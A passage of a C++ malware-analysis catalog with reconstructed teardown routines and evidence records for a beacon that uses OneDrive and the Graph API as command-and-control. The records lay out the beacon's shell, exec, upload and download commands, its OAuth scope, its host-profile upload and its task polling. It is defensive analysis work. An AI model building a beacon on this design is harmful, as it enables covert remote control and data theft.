// ============================================================================

void beacon_stop_workers(BeaconContext* ctx)
{
    if (!ctx->running_flag)
        return;

    /* Lock mutex, clear flags */
    /* _Mtx_lock(&ctx->mutex_1); */
    ctx->running_flag = 0;
    ctx->alive_flag   = 0;

    /* Broadcast condition variable to wake sleeping workers */
    /* _Cnd_broadcast(&ctx->cond_var_1); */
    /* _Cnd_broadcast(&ctx->cond_var_2); */
    /* _Mtx_unlock(&ctx->mutex_1); */

    /* Join worker thread 1 */
    /* if (thread_handle_1[1]) _Thrd_join(thread_handle_1, nullptr); */
    memset(ctx->thread_handle_1, 0, sizeof(ctx->thread_handle_1));

    /* Join worker thread 2 */
    /* if (thread_handle_2[1]) _Thrd_join(thread_handle_2, nullptr); */
    memset(ctx->thread_handle_2, 0, sizeof(ctx->thread_handle_2));
}

// ============================================================================
// IDA Decompilation -- beacon_context_destroy @ 0x0040F190
// Size: ~0x300 bytes
//
// Summary (malware analysis):
//   Full teardown of the beacon context.  Stops all worker threads,
//   clears every string field (SSO clear-and-shrink), destroys
//   mutexes and condition variables, frees the graph_session if
//   non-null, then clears the graph API config.
// ============================================================================

void beacon_context_destroy(BeaconContext* ctx)
{
    /* Stop workers first */
    beacon_stop_workers(ctx);

    /* Clear all string fields */
    ctx->agent_id.clear();
    ctx->base_path.clear();
    ctx->job_path.clear();
    ctx->result_path.clear();
    ctx->upload_path.clear();
    ctx->download_path.clear();
    ctx->shell_output.clear();

    /* Destroy mutexes */
    /* _Mtx_destroy(&ctx->mutex_1); */
    /* _Mtx_destroy(&ctx->mutex_2); */

    /* Destroy condition variables */
    /* _Cnd_destroy(&ctx->cond_var_1); */
    /* _Cnd_destroy(&ctx->cond_var_2); */

    /* Free graph session if non-null */
    if (ctx->graph_session)
    {
        /* graph_api_session_destroy(ctx->graph_session); */
        /* operator delete(ctx->graph_session); */
        ctx->graph_session = nullptr;
    }

    /* Clear graph API config strings */
    graph_api_config_clear(ctx);
}

// ============================================================================
// IDA Decompilation -- graph_api_config_clear @ 0x0040F030
// Size: ~0xF0 bytes
//
// Summary (malware analysis):
//   Clears the first five configuration strings from the beacon context.
//   These are the OAuth/Graph API credential fields that were loaded
//   from the config file during startup.
// ============================================================================

void graph_api_config_clear(BeaconContext* ctx)
{
    ctx->client_id.clear();
    ctx->client_secret.clear();
    ctx->refresh_token.clear();
    ctx->tenant_id.clear();
    ctx->drive_root.clear();
}

// ============================================================================
// FunctionEvidence entries for the analysis catalog
// ============================================================================

FunctionEvidence command_dispatch_evidence() {
  FunctionEvidence out;
  out.address = 0x00411220;
  out.function = "execute_beacon_command";
  out.purpose = "Dispatches remote command verbs to process, transfer, and timing handlers";
  out.indicators = {
      "String compare: \"kill\" at 0x41129B",
      "String compare: \"shell\" at 0x4112C1",
      "String compare: \"exec\" at 0x411568",
      "String compare: \"upload\" at 0x411710",
      "String compare: \"download\" at 0x41190C",
      "String compare: \"sleep\" at 0x411C4F",
      "String compare: \"rest\" at 0x411D54",
      "Error: \"Unknown command: \" prefix at 0x411E5F",
      "Error: \"Missing required parameters: onedrive_path and/or agent_path\" at 0x411893",
      "Error: \"Download parameter must be a string file path\" at 0x411BB7",
      "Error: \"Command execution failed\" at 0x412345",
      "Status strings: \"completed\", \"failed\" at 0x4114DB",
      "Calls: run_shell_and_capture_output, spawn_process_detached",
      "Calls: upload_local_file_to_agent_path, publish_task_result",
      "Shell output truncation to 100 chars + \"...\" at 0x4121E8",
      "JSON field names: \"command\", \"params\", \"output\", \"error\", "
          "\"filename\", \"agent_path\", \"onedrive_path\"",
  };
  return out;
}

FunctionEvidence worker_loop_evidence() {
  FunctionEvidence out;
  out.address = 0x00410320;
  out.function = "beacon_worker_loop";
  out.purpose = "Main C2 polling loop: collects tasks, downloads, executes, publishes results";
  out.indicators = {
      "Runs as dedicated thread from beacon_start_workers",
      "Polls running_flag at this+280",
      "Calls collect_pending_task_names to list /job folder",
      "Calls select_next_task_id for FIFO task ordering",
      "Calls download_remote_task_file_by_agent_path to fetch task JSON",
      "Parses task JSON for \"command\" and \"params\" fields",
      "Sets status \"inprogress\" before execution",
      "Calls graph_api_delete_item_by_path to claim task",
      "Calls execute_beacon_command for dispatch",
      "Calls publish_task_result (skipped for \"kill\" command)",
      "Mutex lock at this+300, condvar wait at this+396 with sleep_seconds timeout",
  };
  return out;
}

FunctionEvidence beacon_init_evidence() {
  FunctionEvidence out;
  out.address = 0x0040F4A0;
  out.function = "beacon_initialize";
  out.purpose = "Initializes beacon: creates Graph API session, generates agent ID, "
                "creates OneDrive folder structure, uploads host info";
  out.indicators = {
      "OAuth scope: \"offline_access Files.Read Files.ReadWrite\"",
      "Calls graph_api_session_create",
      "Calls graph_api_refresh_access_token",
      "Calls build_host_machine_guid for agent_id at this+136",
      "Constructs paths: base_path + \"/job\", \"/result\", \"/upload\", \"/download\"",
      "Calls graph_api_list_root_children to detect existing agent folder",
      "Calls write_beacon_alive_file if agent folder exists",
      "Calls ensure_job_result_paths_exist if creating new",
      "Uploads \"info.txt\" with host profile via write_remote_text_file",
  };
  return out;
}

FunctionEvidence beacon_ctx_init_evidence() {
  FunctionEvidence out;
  out.address = 0x0040EE30;
  out.function = "beacon_context_init";
  out.purpose = "Constructor for beacon context structure; copies config fields "
                "and zero-initializes operational state";
  out.indicators = {
      "Copies 5 SSO strings: client_id, client_secret, refresh_token, tenant_id, drive_root",
      "Copies 3 int fields at +120 (sleep_seconds), +124, +128 (initial_delay)",
      "Initializes graph_session ptr to nullptr at +132",
      "Initializes 7 empty SSO strings for paths and state at +136..+276",
      "running_flag = 0 at +280, alive_flag = 0 at +281",
      "_Mtx_init_in_situ(+300, 2) and (+348, 2) -- recursive mutexes",
      "Condition variables initialized at +396 and +436",
      "Shell output buffer initialized empty at +476",
  };
  return out;
}

FunctionEvidence start_workers_evidence() {
  FunctionEvidence out;
  out.address = 0x0040FB00;
  out.function = "beacon_start_workers";
  out.purpose = "Starts worker and heartbeat threads after initial delay";
  out.indicators = {
      "Checks running_flag at +280; returns if already set",
      "Sets running_flag=1, alive_flag=1",
      "Sleeps for field_128 seconds (initial delay from config)",
      "Creates thread 1: beacon_worker_loop, handle stored at +284",
      "Creates thread 2: sub_40FD30 (heartbeat), handle stored at +292",
      "Calls terminate() on thread creation failure",
  };
  return out;
}

FunctionEvidence shell_exec_evidence() {
  FunctionEvidence out;
  out.address = 0x00412560;
  out.function = "run_shell_and_capture_output";
  out.purpose = "Executes shell command via system(), captures output "
                "from temp file, stores in beacon context";
  out.indicators = {
      "Temp file: %TEMP%\\\\beacon_shell_output.txt",
      "Command format: <cmd> > \"<tempfile>\" 2>&1",
      "Reads output from file into string",
      "Error fallback: \"Failed to read command output\"",
      "Deletes temp file after reading via DeleteFileW",
      "Stores output at beacon context +476 (shell_output)",
      "Truncation via sub_412FC0",
  };
  return out;
}

FunctionEvidence upload_file_evidence() {
  FunctionEvidence out;
  out.address = 0x004134B0;
  out.function = "upload_local_file_to_agent_path";
  out.purpose = "Uploads a local file to OneDrive via Graph API, "
                "with directory creation and write-permission test";
  out.indicators = {
      "Constructs OneDrive path: onedrive_path + \"/files/\" + onedrive_path",
      "Calls graph_api_get_item_by_path to verify item",
      "Creates local directory if not exists",
      "Write-permission test: creates \\\\test_write_permission.tmp, writes \"test\", deletes",
      "Calls resolve_drive_path_to_item_id",
      "Calls graph_api_upload_item_content_from_file",
      "Verifies upload via path_exists and path_file_size",
  };
  return out;
}

FunctionEvidence publish_result_evidence() {
  FunctionEvidence out;
  out.address = 0x004150D0;
  out.function = "publish_task_result";
  out.purpose = "Serializes task result as JSON and writes to /result and "
                "/download folders on OneDrive";
  out.indicators = {
      "Strips \".txt\" and \".tmp\" suffixes from task name",
      "For \"shell\" commands: JSON format {\"status\":\"success\",\"result\":\"<escaped>\"}",
      "Calls escape_json_string for output encoding",
      "Status values: \"success\", \"failed\"",
      "Writes result as <basename>.txt to /result folder via sub_416220",
      "Falls back to /download folder on write failure",
      "For non-shell: serializes full JSON object with \"status\" and \"result\" fields",
      "Clears beacon shell output buffer (this+476) after publishing",
  };
  return out;
}

FunctionEvidence select_task_evidence() {
  FunctionEvidence out;
  out.address = 0x00410E70;
  out.function = "select_next_task_id";
  out.purpose = "Selects the lexicographically smallest valid task from "
                "pending task list for FIFO ordering";
  out.indicators = {
      "Iterates pending task name vector",
      "Constructs check path: job_path + \"/\" + task_name",
      "Calls graph_api_get_item_by_path to verify each task exists",
      "Selects task with lexicographically smallest name",
      "Returns empty string if no valid tasks found",
  };
  return out;
}

FunctionEvidence download_task_evidence() {
  FunctionEvidence out;
  out.address = 0x00414D50;
  out.function = "download_remote_task_file_by_agent_path";
  out.purpose = "Downloads a task file from OneDrive by constructing "
                "base_path/task_id and fetching via Graph API";
  out.indicators = {
      "Constructs path: base_path + \"/\" + task_id",
      "Calls resolve_drive_path_to_item_id",
      "Calls graph_api_download_item_content",
      "Returns empty string on item-not-found",
  };
  return out;
}

FunctionEvidence spawn_detached_evidence() {
  FunctionEvidence out;
  out.address = 0x00412DF0;
  out.function = "spawn_process_detached";
  out.purpose = "Launches a process fire-and-forget via CreateProcessW "
                "with no console or window inheritance";
  out.indicators = {
      "Returns 1 on empty command string",
      "MultiByteToWideChar with codepage 0xFDE9",
      "_wcsdup for mutable command line buffer",
      "CreateProcessW(nullptr, cmdline, nullptr, nullptr, FALSE, 0, ...)",
      "CloseHandle on both hProcess and hThread immediately",
      "Returns 0 on success, 1 on failure",
  };
  return out;
}

FunctionEvidence escape_json_evidence() {
  FunctionEvidence out;
  out.address = 0x00414900;
  out.function = "escape_json_string";
  out.purpose = "Escapes a string for JSON embedding: backslash, quotes, "
                "control chars (\\b \\t \\n \\f \\r), and \\uXXXX for non-ASCII";
  out.indicators = {
      "Reserves 2x input length",
      "\\\\b, \\\\t, \\\\n, \\\\f, \\\\r for control characters",
      "\\\\uXXXX via snprintf(\"\\\\u%%04x\") for chars < 0x20 or >= 0x7F",
      "Backslash-escapes \\\\ and \\\" characters",
      "Printable ASCII (0x20-0x7E) passed through directly",
  };
  return out;
}

}  // namespace oceandrift::analysis
